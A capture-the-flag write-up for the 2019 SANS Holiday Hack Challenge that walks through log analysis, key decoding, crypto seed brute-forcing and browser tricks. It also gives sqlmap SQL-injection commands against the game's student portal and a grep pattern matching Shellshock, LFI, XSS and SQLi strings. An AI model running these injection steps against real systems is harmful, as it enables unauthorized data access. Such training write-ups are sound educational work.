# KringleCon2019
Write up for the 2019 SANS Holiday Hack Challenge, KringleCon 2


# Objectives

## 00 - Talk to Santa in the Quad
*Enter the campus quad and talk to Santa.*

**Answer: Obvious! Go have a chat with Santa**


## 01 - Find the Turtle Doves
*Find the missing turtle doves.*

**Answer: Walk into the Student Union, and chat with Michael and Jane, sitting next to the fireplace.**


## 02 - Unredact Threatening Document
Difficulty: 🌲

*Someone sent a threatening letter to Elf University. What is the first word in ALL CAPS in the subject line of the letter? Please find the letter in the Quad.*

Walk to the top left corner of The Quad, there is a letter sitting on the ground behind a tree. Click it.

The easiest way to reveal the text under the confidential boxes is simply to click anywhere in the open PDF, press Ctrl + A to select all, Ctrl + C to copy, open a text editor, and paste the text. All text, including that under the confidential boxes, gets copied.

**Answer: DEMAND**


## 03 - Windows Log Analysis: Evaluate Attack Outcome
Difficulty: 🌲

*We're seeing attacks against the Elf U domain! Using [the event log data](https://downloads.elfu.org/Security.evtx.zip), identify the user account that the attacker compromised using a password spray attack. Bushy Evergreen is hanging out in the train station and may be able to help you out.*

Running the DeepBlueCLI downloaded from github against the provided Windows Security log file, look for a successful login after a series of "High number of login failures for one account" alerts.

**Answer: supatree**


## 04 - Windows Log Analysis: Determine Attacker Technique
Difficulty: 🌲🌲

*Using [these normalized Sysmon logs](https://downloads.elfu.org/sysmon-data.json.zip), identify the tool the attacker used to retrieve domain password hashes from the lsass.exe process. For hints on achieving this objective, please visit Hermey Hall and talk with SugarPlum Mary.*

Open sysmon-data.json, find the process where the parent_process_name == lsass.exe, find its pid, search for a process with a ppid equal to the previously found pid

    eql query -f sysmon-data.json 'process where parent_process_name == "lsass.exe" ' | jq

    eql query -f sysmon-data.json 'process where (logon_id == 999 and ppid == 3440)' | jq

**Answer: ntdsutil**


## 05 - Network Log Analysis: Determine Compromised System
Difficulty: 🌲🌲

*The attacks don't stop! Can you help identify the IP address of the malware-infected system using these [Zeek logs](https://downloads.elfu.org/elfu-zeeklogs.zip)? For hints on achieving this objective, please visit the Laboratory and talk with Sparkle Redberry.*

Installed RITA and MongoDB, used RITA to import unzip logs, generated an html report, viewed beacons, picked the top source IP (which had the highest score and and also the largest number of connections)

**Answer: 192.168.134.130**


## 06 - Splunk
Difficulty: 🌲🌲🌲

*Access https://splunk.elfu.org/ as elf with password elfsocks. What was the message for Kent that the adversary embedded in this attack? The SOC folks at that link will help you along! For hints on achieving this objective, please visit the Laboratory in Hermey Hall and talk with Prof. Banas.*

Login with Username: elf  Password: elfsocks.

Training Questions

1:  sweetums

2:  C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt

3:  144.202.46.214.vultr.com

4:  19th Century Holiday Cheer Assignment.docm

5:  21

    index=main sourcetype=stoq  "results{}.workers.smtp.subject"="Holiday Cheer Assignment Submission" | table results{}.workers.smtp.from

6:  123456789

7:  bradly.buttercups@eifu.org

    index=main sourcetype=stoq "19th Century Holiday Cheer Assignment.docm" | table _time results{}.workers.smtp.to results{}.workers.smtp.from  results{}.workers.smtp.subject results{}.workers.smtp.body | sort - _time

Using the below query points out the location in the archive of the core.xml file. Download it and the message is the value in the "dc:description" key

    index=main sourcetype=stoq  "results{}.workers.smtp.from"="bradly buttercups <bradly.buttercups@eifu.org>" | eval results = spath(_raw, "results{}") 
        | mvexpand results
        | eval path=spath(results, "archivers.filedir.path"), filename=spath(results, "payload_meta.extra_data.filename"), fullpath=path."/".filename 
        | search fullpath!="" 
        | table filename,fullpath

**Answer: Kent you are so unfair. And we were going to make you the king of the Winter Carnival.**


## 07 - Get Access To The Steam Tunnels
Difficulty: 🌲🌲🌲

*Gain access to the steam tunnels. Who took the turtle doves? Please tell us their first and last name. For hints on achieving this objective, please visit Minty's dorm room and talk with Minty Candy Cane.*

Walk into Minty's dorm room with the key cutter, spot Krampus and the key hanging from his belt. His avatar image can be [found here](https://2019.kringlecon.com/images/avatars/elves/krampus.png). 

The lock in the closet has the brand name "Schlage" on it, so use the [Schlage key bitting template](https://github.com/deviantollam/decoding) provided by Deviant Ollam from his KringleCon 2019 talk, [Optical Decoding of Keys](https://www.youtube.com/watch?v=KU6FJnbkeLA&t=793s).

Overlay it on top of the image of Krampus' key, and decode it. I used GIMP, putting the bitting template on one layer and the key on another, resizing both until they lined up. The key decodes to (1-2-2-5-2-0). 

Use the [key cutting machine](https://key.elfu.org/?challenge=bitting-cutter) to cut a key with this code, then open the lock in the closet with that key. Walk in, talk to Krampus.

**Answer: Krampus Hollyfeld**


## 08 - Bypassing the Frido Sleigh CAPTEHA
Difficulty: 🌲🌲🌲🌲

*Help Krampus beat the [Frido Sleigh contest](https://fridosleigh.com/). For hints on achieving this objective, please talk with Alabaster Snowball in the Speaker Unpreparedness Room.*

Merged code from capteha_api.py and predict_images_using_trained_model.py as well as some custom code to reformat the uuids, ran the script. 

**Answer: 8Ia8LiZEwvyZr2WO**


## 09 - Retrieve Scraps of Paper from Server
Difficulty: 🌲🌲🌲🌲

*Gain access to the data on the [Student Portal](https://studentportal.elfu.org/) server and retrieve the paper scraps hosted there. What is the name of Santa's cutting-edge sleigh guidance system? For hints on achieving this objective, please visit the dorm and talk with Pepper Minstix.*

I used this python code to retrieve a validator token code
     
     import requests;print( requests.request("GET", "https://studentportal.elfu.org/validator.php").text )

find vulns!

     python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=&token=blah' -p elfmail --eval="import requests;token=requests.request(\"GET\", \"https://studentportal.elfu.org/validator.php\").text" -v 5 --dbms MySQL

get dbs and tables

     python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=&token=blah' -p elfmail --eval="import requests;token=requests.request(\"GET\", \"https://studentportal.elfu.org/validator.php\").text" --dbms MySQL --tables

Output

    available databases [2]:
    [*] elfu
    [*] information_schema

    Database: elfu
    [3 tables]
    +---------------------------------------+
    | applications                          |
    | krampus                               |
    | students                              |
    +---------------------------------------+

get everything from "krampus" table in "elfu" db

     python sqlmap.py -u 'https://studentportal.elfu.org/application-check.php?elfmail=&token=blah' -p elfmail --eval="import requests;token=requests.request(\"GET\", \"https://studentportal.elfu.org/validator.php\").text" --dbms MySQL -D elfu -T krampus --sql-query="select * from krampus;"

Output

    [*] /krampus/0f5f510e.png, 1
    [*] /krampus/1cc7e121.png, 2
    [*] /krampus/439f15e6.png, 3
    [*] /krampus/667d6896.png, 4
    [*] /krampus/adb798ca.png, 5
    [*] /krampus/ba417715.png, 6

Download all the paper scraps

    wget https://studentportal.elfu.org/krampus/0f5f510e.png;
    wget https://studentportal.elfu.org/krampus/1cc7e121.png;
    wget https://studentportal.elfu.org/krampus/439f15e6.png;
    wget https://studentportal.elfu.org/krampus/667d6896.png;
    wget https://studentportal.elfu.org/krampus/adb798ca.png;
    wget https://studentportal.elfu.org/krampus/ba417715.png;

Open images in GIMP, one image per layer, rotate and re-arrage them.

**Answer: Super Sled-o-matic**


## 10 - Recover Cleartext Document
Difficulty: 🌲🌲🌲🌲🌲

*The [Elfscrow Crypto](https://downloads.elfu.org/elfscrow.exe) tool is a vital asset used at Elf University for encrypting SUPER SECRET documents. We can't send you the source, but we do have [debug symbols](https://downloads.elfu.org/elfscrow.pdb) that you can use.*

*Recover the plaintext content for this [encrypted document](https://downloads.elfu.org/ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc). We know that it was encrypted on December 6, 2019, between 7pm and 9pm UTC.*

*What is the middle line on the cover page? (Hint: it's five words)*

*For hints on achieving this objective, please visit the NetWars room and talk with Holly Evergreen.*

Hints from Holly Evergreen:

*... digital rights management can bring a hacking elf down. That ElfScrow one can really be a hassle. It's a good thing Ron Bowes is [giving a talk](https://www.youtube.com/watch?v=obJdpKDpFBA) on reverse engineering! That guy knows how to rip a thing apart. It's like he breathes opcodes!*

I started with [Ron's template](https://github.com/CounterHack/reversing-crypto-talk-public/blob/master/demoes/demo7%20-%20putting%20it%20all%20together/demo7%20-%20solution%20skeleton.rb) and completed the 'generate_key' function by following the hints he gives in his reversing crypto talk.

I used the LCG::Microsoft rand() code found at https://rosettacode.org/wiki/Linear_congruential_generator#Ruby

The solve.rb script I used can be found [here](obj10/solve.rb)

I ran this script to generate a list of all the timestamps in the time range given, run the solve.rb script for each time stamp which spits out an attempt at the decrypted PDF. The last step searches through all the "decrypted" files and prints out the name of the files with a "magic number" that matches that of a PDF file.

    #!/bin/bash
    START=1575658800  ## December 6, 2019 7pm UTC
    END=1575666000    ## December 6, 2019 9pm UTC
    INFILE="ElfUResearchLabsSuperSledOMaticQuickStartGuideV1.2.pdf.enc"

    mkdir out
    for SEED in $(seq $START $END); do
    ruby solve.rb ${SEED} ${INFILE}
    done

    find ./out -type f -exec sh -c '
        case $( file -bi "$1" ) in
            */pdf*) exit 0
        esac
        exit 1' sh {} ';' -print

This returns the a single PDF file name, decrypted using a seed of 1575663650 and a key = b5ad6a321240fbec

Open up 1575663650-dec.pdf and read the 5 word string in the middle of the first page.

**Answer: Machine Learning Sleigh Route Finder**


## 11 - Open the Sleigh Shop Door
Difficulty: 🌲🌲🌲🌲🌲

*Visit Shinny Upatree in the Student Union and help solve their problem. What is written on the paper you retrieve for Shinny?*

*For hints on achieving this objective, please visit the Student Union and talk with Kent Tinseltooth.*


Crack all the locks on [the crate](https://sleighworkshopdoor.elfu.org/)

To open each lock, use Browser Dev Tools (F12 in Chrome)

1: Console tab: scroll down

2: Open print preview of page,  hidden text will show up next to the lock

3: Network tab, watch for a delayed load of a png file

4: Application tab, storage, expand local storage, select the crate url, view the single key value pair

5: Elements tab, expand \<head>, look at the end of \<title>

6: Inspect hologram image, view element style, un-check perspective box

7: Right click and Inspect the instructions text, view .instructions style, look at the first font listed in font-family

8: Right click and Inspect the .eggs text, click event listeners, expand spoil: VERONICA

9: Right click and Inspect the word "next", right click on each span, select "force state, :active", read the new red letters that pop up on the page

10: Right click and inspect the c10 lock element, expand it, right click on the "cover" DIV and click "Hide Element". The lock code "KD29XJ37" is written on the PCB, then Search the DOM for "macaroni" "swab" and "gnome" DIV elements. Drag each into the lock c10 lock div. Click the exposed button.


**Answer: The Tooth Fairy**

## 12 - Filter Out Poisoned Sources of Weather Data
Difficulty: 🌲🌲🌲🌲

*Use the data supplied in the [Zeek JSON logs](https://downloads.elfu.org/http.log.gz) to identify the IP addresses of attackers poisoning Santa's flight mapping software. [Block the 100 offending sources of information to guide Santa's sleigh](https://srf.elfu.org/) through the attack. Submit the Route ID ("RID") success value that you're given. For hints on achieving this objective, please visit the Sleigh Shop and talk with Wunorse Openslae.*

Download and extract the zeek json formated log http.log. jq is a great tool for viewing, parsing, and searching json files.

    wget https://downloads.elfu.org/http.log.gz
    gunzip http.log.gz

A hint from the PDF found in objective 10 states that the default username and password for the Sleigh Route Finder (SRF) can be found in the readme of the the ElfU Research Labs git repository. 

If you search the http.log for "README", you find a URI containing "/README.md". Browse to https://srf.elfu.org/README.md and find the default credentials: 

    admin 924158F9522B3744F5FCD4D10FAC4356

Start searching the http.log for evidence of Cross-site scripting (XSS), Local File Inclusion (LFI), Shellshock (SS), and SQL injection (SQLi) attacks.

I wrote this one-liner bash command which found 62 such attacks and stored each attacker's IP in a file.

    cat http.log | jq -s -j '.[0][] | .["id.orig_h"], ", ", .uri, " ", .host, " ", .user_agent, " ", .username, "\n"' | egrep --color=always -i '\.\.|etc/|<|>|\{ :; \};|\$|\;cat|union|1=1' |  awk -F, '{print $1}' > 62-bad-ips.txt

This command dumps a CSV formatted list of each of those IPs we just found, ready to be pasted straight into the SRF Firewall tool:

    cat 62-bad-ips.txt |  awk -F, '{print $1}' | tr '\n' ','

Output:

    42.103.246.250,56.5.47.137,19.235.69.221,69.221.145.150,42.191.112.181,48.66.193.176,49.161.8.58,84.147.231.129,44.74.106.131,106.93.213.219,2.230.60.70,10.155.246.29,225.191.220.138,75.73.228.192,249.34.9.16,27.88.56.114,238.143.78.114,121.7.186.163,106.132.195.153,129.121.121.48,190.245.228.38,34.129.179.28,135.32.99.116,2.240.116.254,45.239.232.245,102.143.16.184,230.246.50.221,131.186.145.73,253.182.102.55,229.133.163.235,23.49.177.78,223.149.180.133,33.132.98.193,84.185.44.166,254.140.181.172,150.50.77.238,187.178.169.123,116.116.98.205,9.206.212.33,28.169.41.122,68.115.251.76,118.196.230.170,173.37.160.150,81.14.204.154,135.203.243.43,186.28.46.179,13.39.153.254,111.81.145.191,0.216.249.31,31.254.228.4,220.132.33.81,83.0.8.119,150.45.133.97,229.229.189.246,227.110.45.126,61.110.82.125,65.153.114.120,123.127.233.97,95.166.116.45,80.244.147.207,168.66.108.62,200.75.228.240

Next I created a tab separated formatted file of all log entries (CSV breaks because several of the fields contain commas):

    cat http.log | jq -s -j '.[0][] | .ts,"\t",.uid,"\t",.["id.orig_h"],"\t",.["id.orig_p"],"\t",.["id.resp_h"],"\t",.["id.resp_p"],"\t",.method,"\t",.host,"\t",.uri,"\t",.referrer,"\t",.version,"\t",.user_agent,"\t",.origin,"\t",.status_code,"\t",.info_code,"\t",.info_msg,"\t",.username,"\t",.password,"\t",.proxied,"\t",.orig_fuids,"\t",.orig_filenames,"\t",.orig_mime_types,"\t",.resp_fuids,"\t",.resp_filenames,"\t",.resp_mime_types,"\n"' >> all.tsv

To find the rest of the IPs, we have to pivot using information gathered from the logs of 62 attackers. If you look closely at the user-agents used by those attackers, most are using variations of "normal" user-agents, along with some user-agents used by known malware.

These two command create a list of all the user agents the 62 attackers used:

    for ip in $(cat 62-bad-ips.txt); do cat http.log| jq -s -j '.[0][]|.["id.orig_h"],", ",.user_agent, "\n"' | grep $ip; done |tee 62-bad-useragents.txt

    cat 62-bad-useragents.txt | awk -F', ' '{print $2}' | sort | uniq > bad-user-agents.txt

Now let's gather a list of all the unique IPs (in CSV format) from the list of known bad user agents:
    
    while read useragent; do grep "$useragent" all.tsv | awk -F"\t" '{print $3}'; done <bad-user-agents.txt | sort | uniq | tr '\n' ','

Output:

    10.122.158.57,10.155.246.29,102.143.16.184,103.235.93.133,104.179.109.113,106.132.195.153,106.93.213.219,116.116.98.205,118.26.57.38,121.7.186.163,123.127.233.97,126.102.12.53,129.121.121.48,131.186.145.73,135.32.99.116,140.60.154.239,142.128.135.10,148.146.134.52,158.171.84.209,168.66.108.62,185.19.7.133,187.152.203.243,187.178.169.123,190.245.228.38,19.235.69.221,200.75.228.240,203.68.29.5,217.132.156.225,2.230.60.70,223.149.180.133,22.34.153.164,2.240.116.254,225.191.220.138,226.102.56.13,226.240.188.154,229.133.163.235,230.246.50.221,231.179.108.238,23.49.177.78,238.143.78.114,249.237.77.152,249.34.9.16,249.90.116.138,250.22.86.40,252.122.243.212,253.182.102.55,253.65.40.39,27.88.56.114,28.169.41.122,29.0.183.220,31.116.232.143,34.129.179.28,34.155.174.167,37.216.249.50,42.103.246.130,42.103.246.250,42.127.244.30,42.16.149.112,42.191.112.181,44.164.136.41,44.74.106.131,45.239.232.245,48.66.193.176,49.161.8.58,50.154.111.0,53.160.218.44,56.5.47.137,61.110.82.125,65.153.114.120,66.116.147.181,69.221.145.150,75.73.228.192,80.244.147.207,84.147.231.129,87.195.80.126,9.206.212.33,92.213.148.0,95.166.116.45,97.220.93.190

Paste the two sets of IPs into the firewall form, click DENY

Route Calculation Success! RID:0807198508261964

**Answer: 0807198508261964**